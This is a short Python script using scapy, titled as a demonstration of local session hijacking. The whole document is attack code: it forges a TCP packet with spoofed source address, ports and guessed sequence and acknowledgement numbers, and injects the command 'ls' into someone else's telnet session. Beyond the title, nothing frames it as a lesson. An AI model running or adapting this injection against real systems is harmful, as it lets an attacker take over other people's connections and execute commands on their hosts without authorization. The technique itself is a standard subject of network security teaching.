## Python script that shows how Session Hijacking can be performed locally

#!/usr/bin/env python

import sys
from scapy.all import *

interface = "eth0"
srcIP = None
targetIP = None
targetprt = None
srcprt = None
seq = None
ack = None
Data = None

class SendTelnetdata():
	global srcIP, targetIP, targetprt, srcprt, Data

	def transfer(self):
		i = IP()
		i.src = srcIP
		i.dst = targetIP

		t = TCP()
		t.sport = srcprt
		t.dport = targetprt
		t.flags = 'AP'
		t.seq = seq
		t.ack = ack
		t.len = 6	
		Data = "ls\r\n"
		send(i/t/Raw(load=Data), verbose=0)


if __name__ == "__main__":
	# Check for all required arguments
	if len(sys.argv) != 7:
		print "Usage: %s <SrcIP> <SrcPrt> <TargetIP> <TargetPrt> <SeqNo> <ACK>" % sys.argv[0]
		exit()

	# Get required variables
	srcIP = sys.argv[1]
	srcprt = int(sys.argv[2])
	targetIP = sys.argv[3]
	targetprt = int(sys.argv[4])
	seq = int(sys.argv[5])
	ack = int(sys.argv[6])
	conf.iface = interface 

	print "Sending from:%s:%i to %s:%i" % (srcIP, srcprt, targetIP, targetprt)
	SendTelnetdata().transfer()
